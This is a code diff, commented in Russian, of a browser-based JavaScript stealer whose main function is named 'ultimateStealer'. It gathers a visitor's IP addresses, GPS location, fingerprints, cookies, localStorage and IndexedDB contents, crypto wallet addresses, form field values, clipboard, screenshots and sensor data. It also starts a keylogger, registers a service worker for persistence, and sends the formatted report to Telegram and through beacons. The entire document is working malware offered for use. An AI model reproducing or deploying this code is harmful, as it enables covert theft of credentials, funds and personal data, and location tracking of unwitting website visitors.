+                }
+                if (allIPs.length) {
+                    lines.push(`🌐 ВСЕ IP: ${[...new Set(allIPs)].join(', ')}`);
+                    lines.push('');
+                }
+                if (n.webrtc && n.webrtc.local && n.webrtc.local.length) {
+                    lines.push(`📡 WebRTC локальные: ${n.webrtc.local.join(', ')}`);
+                }
+                if (n.network) {
+                    const conn = n.network;
+                    lines.push(`📶 Сеть: ${conn.effectiveType || '?'} ${conn.downlink || '?'}Mbps, RTT ${conn.rtt || '?'}ms`);
+                }
+                if (n.dns) {
+                    lines.push(`🕵️ DNS: ${n.dns.domain} (${n.dns.time || 'таймаут'}ms)`);
+                }
+                if (n.timing && n.timing.length) {
+                    const avg = Math.round(n.timing.reduce((a,b) => a + b, 0) / n.timing.length);
                     lines.push(`⏱ Временная атака: avg ${avg}ms`);
                 }
+                lines.push('');
+                if (allIPs.length) {
+                    lines.push(`🔗 https://www.google.com/maps?q=${allIPs[0]}`);
+                    lines.push('');
+                }
             }
-            
-            // Google Maps link
-            if (data.ip) {
-                lines.push(`🔗 https://www.google.com/maps?q=${data.ip}`);
+
+            // GPS            if (data.gps) {
+                lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon} (${data.gps.acc}m)`);
+                lines.push('');
             }
-            lines.push('');
-            
-            // Fingerprints
+
+            // Устройство
+            if (data.device) {
+                const d = data.device;
+                lines.push(`💻 ${d.os || 'unknown'} ${d.osVersion || ''}, ${d.browser || ''} ${d.browserVersion || ''}`);
+                if (d.model && d.model !== 'unknown') lines.push(`📱 Модель: ${d.model}`);
+                lines.push(`   ${d.cores || '?'} ядер, ${d.memory || '?'}GB RAM`);
+                if (d.screen) {
+                    lines.push(`   Экран: ${d.screen.width}x${d.screen.height} (${d.screen.pixelRatio}x)`);
+                }
+                lines.push('');
+            }
+
+            // Фингерпринты
             if (data.fingerprints) {
                 const f = data.fingerprints;
                 if (f.webgl && f.webgl.renderer) lines.push(`🎯 WebGL: ${f.webgl.renderer}`);
                 if (f.audio) lines.push(`🎯 Audio: ${f.audio.sampleRate}Hz`);
                 if (f.timezone) lines.push(`🎯 Время: ${f.timezone}`);
-                if (f.screen) lines.push(`🎯 Экран: ${f.screen.width}x${f.screen.height}`);
                 if (f.fonts && f.fonts.length) {
-                    lines.push(`🎯 Шрифты: ${f.fonts.slice(0, 5).join(', ')}${f.fonts.length > 5 ? '...' : ''}`);
+                    const fonts = f.fonts.slice(0, 8);
+                    lines.push(`🎯 Шрифты: ${fonts.join(', ')}${f.fonts.length > 8 ? '...' : ''}`);
                 }
+                if (f.canvas) lines.push(`🎯 Canvas: ${f.canvas.slice(0, 30)}...`);
                 lines.push('');
             }
-            
-            // System
-            if (data.system) {
-                const s = data.system;
-                lines.push(`💻 ${s.os || 'unknown'} ${s.platform || ''}, ${s.cores || '?'} ядер, ${s.memory || '?'}GB RAM`);
-                lines.push('');
-            }
-            
+
             // Storage
             if (data.storage) {
-                const ls = Object.keys(data.storage.localStorage || {});
-                if (ls.length) {
-                    lines.push(`💾 LocalStorage (${ls.length}):`);
-                    Object.entries(data.storage.localStorage).slice(0, 5).forEach(([k, v]) => {
-                        lines.push(`   ${trunc(k, 15)}: ${trunc(v, 30)}`);
+                const ls = data.storage.localStorage || {};
+                const keys = Object.keys(ls);
+                if (keys.length) {
+                    lines.push(`💾 LocalStorage (${keys.length}):`);
+                    Object.entries(ls).slice(0, 5).forEach(([k, v]) => {
+                        lines.push(`   ${trunc(k, 15)}: ${trunc(v, 40)}`);
                     });
-                    if (ls.length > 5) lines.push(`   ... и ещё ${ls.length - 5}`);
+                    if (keys.length > 5) lines.push(`   ... и ещё ${keys.length - 5}`);
                     lines.push('');
                 }
                 if (data.storage.cookies && data.storage.cookies !== 'нет') {
-                    lines.push(`🍪 Куки: ${trunc(data.storage.cookies, 100)}`);
+                    const c = data.storage.cookies;
+                    lines.push(`🍪 Куки: ${trunc(c, 100)}`);
                     lines.push('');
                 }
             }
-            
-            // Secrets
-            if (data.secrets && data.secrets.length) {
-                lines.push(`🔑 Секреты (${data.secrets.length}):`);
-                data.secrets.slice(0, 5).forEach(s => {
-                    lines.push(`   ${s.path}: ${s.value}`);
+
+            // IndexedDB
+            if (data.indexedDB && data.indexedDB.length) {
+                lines.push(`🗄️ IndexedDB (${data.indexedDB.length} БД):`);
+                data.indexedDB.forEach(db => {
+                    const stores = db.stores?.length || 0;
+                    lines.push(`   ${db.name} (${stores} stores)`);
                 });
-                if (data.secrets.length > 5) lines.push(`   ... и ещё ${data.secrets.length - 5}`);
                 lines.push('');
             }
-            
-            // Wallets
+
+            // Криптовалюта
             if (data.wallets && data.wallets.length) {
                 lines.push(`💰 Криптокошельки:`);
                 data.wallets.forEach(w => {
-                    lines.push(`   ${w.type}: ${w.address}`);
+                    const addr = w.address ? trunc(w.address, 20) : 'установлен';
+                    lines.push(`   ${w.type}: ${addr}`);
+                    if (w.chainId) lines.push(`      Сеть: ${w.chainId}`);
                 });
                 lines.push('');
             }
-            
-            // Extensions
+
+            // Расширения
             if (data.extensions && data.extensions.length) {
                 lines.push(`🔌 Расширения: ${data.extensions.join(', ')}`);
                 lines.push('');
             }
-            
-            // URL
-            if (data.url) {
-                lines.push(`🔗 ${data.url}`);
-                if (data.referrer && data.referrer !== 'нет') lines.push(`↩️ ${data.referrer}`);
+
+            // Пароли
+            if (data.passwords && data.passwords.length) {
+                lines.push(`🔓 Найдены формы (${data.passwords.length}):`);
+                data.passwords.forEach(form => {
+                    form.inputs.forEach(inp => {
+                        if (inp.isPassword) {
+                            lines.push(`   Пароль: ${inp.name || 'unknown'} = [PASSWORD]`);
+                        } else if (inp.value && inp.value.length > 1) {
+                            lines.push(`   ${inp.name || 'field'}: ${inp.value}`);
+                        }
+                    });
+                });
                 lines.push('');
             }
-            
-            // Screenshot
+
+            // Секреты
+            if (data.secrets && data.secrets.length) {
+                lines.push(`🔑 Секреты (${data.secrets.length}):`);
+                data.secrets.slice(0, 8).forEach(s => {
+                    lines.push(`   ${s.path}: ${s.value}`);
+                });
+                if (data.secrets.length > 8) lines.push(`   ... и ещё ${data.secrets.length - 8}`);
+                lines.push('');
+            }
+
+            // DOM
+            if (data.dom) {
+                const d = data.dom;
+                lines.push(`🌐 Страница: ${d.url || 'unknown'}`);
+                if (d.title) lines.push(`   Заголовок: ${d.title}`);
+                if (d.referrer && d.referrer !== 'нет') lines.push(`↩️ ${d.referrer}`);
+                lines.push(`   Формы: ${d.forms}, Inputs: ${d.inputs}, Ссылки: ${d.links}`);
+                lines.push('');
+            }
+
+            // Скриншот
             if (data.screenshot) {
                 const size = Math.round(data.screenshot.length / 1024);
                 lines.push(`🖼 Скриншот: ${size} КБ`);
                 lines.push('');
             }
-            
+
             // Keylogger
             if (data.keylogger) {
                 lines.push(`⌨️ Keylogger: активен`);
+                lines.push('');
             }
-            
+
+            // Буфер обмена
+            if (data.clipboard) {
+                lines.push(`📋 Буфер обмена: ${trunc(data.clipboard, 100)}`);
+                lines.push('');
+            }
+
+            // Service Worker
+            if (data.persistence) {
+                lines.push(`♻️ Service Worker: зарегистрирован`);
+                lines.push('');
+            }
+
+            // Сенсоры
+            if (data.sensors) {
+                const s = data.sensors;
+                if (s.battery) {
+                    lines.push(`🔋 Батарея: ${s.battery.level}%${s.battery.charging ? ' (зарядка)' : ''}`);
+                }
+                if (s.acceleration) {
+                    const a = s.acceleration;
+                    lines.push(`📱 Акселерометр: x=${a.x?.toFixed(2)}, y=${a.y?.toFixed(2)}, z=${a.z?.toFixed(2)}`);
+                }
+                if (s.rotationRate) {
+                    const r = s.rotationRate;
+                    lines.push(`🔄 Гироскоп: α=${r.alpha?.toFixed(2)}, β=${r.beta?.toFixed(2)}, γ=${r.gamma?.toFixed(2)}`);
+                }
+                lines.push('');
+            }
+
+            lines.push('═'.repeat(40));
+            lines.push(`📅 ${data.timestamp}`);
+            lines.push(`⏱ ${data.performance}ms`);
+
             return lines.join('\n');
         }
 
         // ================================================================
-        // 16. ГЛАВНАЯ ФУНКЦИЯ
+        // 17. ГЛАВНАЯ ФУНКЦИЯ — ВСЁ ВМЕСТЕ
         // ================================================================
-        (async function main() {
+        (async function ultimateStealer() {
             try {
                 setStatus('⏳');
-                log('🚀 Stealth stealer with full leaks...');
-
-                // Keylogger
-                const keylogger = setupKeylogger();
-
-                // Параллельный сбор ВСЕГО
                 const start = performance.now();
 
-                const [ips, webrtc, dns, ws, jsonpIP, timing, network, fp, system, storage, wallets, extensions, screenshot] = await Promise.all([
-                    getAllIPs(),
-                    getWebRTC(),
-                    dnsLeak(),
-                    wsLeak(),
-                    jsonpLeak(),
-                    timingAttack(),
-                    Promise.resolve(getNetworkInfo()),
+                // Keylogger и Persistence сразу
+                const keylogger = setupKeylogger();
+                const persistence = setupPersistence();
+
+                // Параллельный сбор ВСЕХ данных
+                const [
+                    networkData,
+                    gps,
+                    device,
+                    fingerprints,
+                    storage,
+                    indexedDB,
+                    wallets,
+                    extensions,
+                    passwords,
+                    dom,
+                    screenshot,
+                    clipboard,
+                    sensors
+                ] = await Promise.all([
+                    getNetworkData(),
+                    getGPS(),
+                    Promise.resolve(getDeviceInfo()),
                     Promise.resolve(getFingerprints()),
-                    Promise.resolve(getSystem()),
                     Promise.resolve(getStorage()),
+                    getIndexedDB(),
                     Promise.resolve(getWallets()),
                     Promise.resolve(getExtensions()),
-                    takeScreenshot()
+                    Promise.resolve(getPasswords()),
+                    Promise.resolve(getDOM()),
+                    takeScreenshot(),
+                    getClipboard(),
+                    getSensors()
                 ]);
 
-                // Собираем данные
-                const allIPs = [];
-                let mainIP = null;
-                let geo = null;
-                
-                Object.values(ips).forEach(({ ip, data }) => {
-                    if (ip) {
-                        allIPs.push(ip);
-                        if (!mainIP) mainIP = ip;
-                        if (data && data.country) geo = data;
-                    }
-                });
-
-                // WebRTC IP
-                if (webrtc && webrtc.public && webrtc.public.length) {
-                    allIPs.push(...webrtc.public);
-                }
-
-                // Уникальные IP
-                const uniqueIPs = [...new Set(allIPs)];
-
-                // Секреты
+                // Секреты из Storage
                 const secrets = findSecrets(storage);
 
-                const data = {
+                // Формируем финальные данные
+                const fullData = {
                     timestamp: new Date().toISOString(),
                     url: window.location.href,
-                    referrer: document.referrer || 'нет',
-                    ip: mainIP,
-                    geo: geo,
-                    allIPs: uniqueIPs,
-                    webrtc: webrtc || { public: [], local: [] },
-                    fetchIP: Object.values(ips).find(i => i.data && i.data.ip)?.ip || null,
-                    jsonpIP: jsonpIP || null,
-                    proxyIP: null, // Можно добавить отдельный прокси-тест
-                    dns: dns || null,
-                    image: { uid: Math.random().toString(36).slice(2), time: null },
-                    ws: ws || null,
-                    network: network || null,
-                    timing: timing || [],
-                    fingerprints: fp || {},
-                    system: system || {},
-                    storage: storage || {},
-                    secrets: secrets || [],
-                    wallets: wallets || [],
-                    extensions: extensions || [],
-                    screenshot: screenshot || null,
-                    keylogger: keylogger || false,
+                    userAgent: navigator.userAgent,
+                    network: networkData,
+                    gps: gps,
+                    device: device,
+                    fingerprints: fingerprints,
+                    storage: storage,
+                    indexedDB: indexedDB,
+                    wallets: wallets,
+                    extensions: extensions,
+                    passwords: passwords,
+                    secrets: secrets,
+                    dom: dom,
+                    screenshot: screenshot,
+                    clipboard: clipboard,
+                    keylogger: keylogger,
+                    persistence: persistence,
+                    sensors: sensors,
                     performance: Math.round(performance.now() - start)
                 };
 
                 // Отчёт
-                const report = formatReport(data);
-                log(`📊 Report: ${report.length} chars`);
+                const report = formatReport(fullData);
+                setStatus('📤');
 
                 // Отправка
-                setStatus('📤');
-                const result = await exfiltrate(report, data);
-                log(`✅ Telegram: ${result.telegram}, Image: ${result.image}, Beacon: ${result.beacon}`);
+                const result = await exfiltrate(report, fullData);
 
                 setStatus('✅');
-
-                // Скрыть статус
                 setTimeout(() => {
                     document.getElementById('status').style.opacity = '0';
                 }, 2000);
 
             } catch (e) {
-                log('❌ Error: ' + e.message);
                 setStatus('⚠️');
+                console.error(e);
             }
         })();
 
         // ================================================================
         // ЗАПУСК
         // ================================================================
-        setTimeout(main, 200);
+        setTimeout(ultimateStealer, 200);
 
-        // Ручной тест в консоли
+        // Тест в консоли
         window.testNow = async function() {
             const r = await fetch('https://api.ipify.org?format=json');
             const d = await r.json();
-            const msg = `🧪 Test IP: ${d.ip}`;
-            await sendTelegram(msg);
+            await sendTelegram(`🧪 Test IP: ${d.ip}`);
             console.log('✅ Test sent');
         };
 
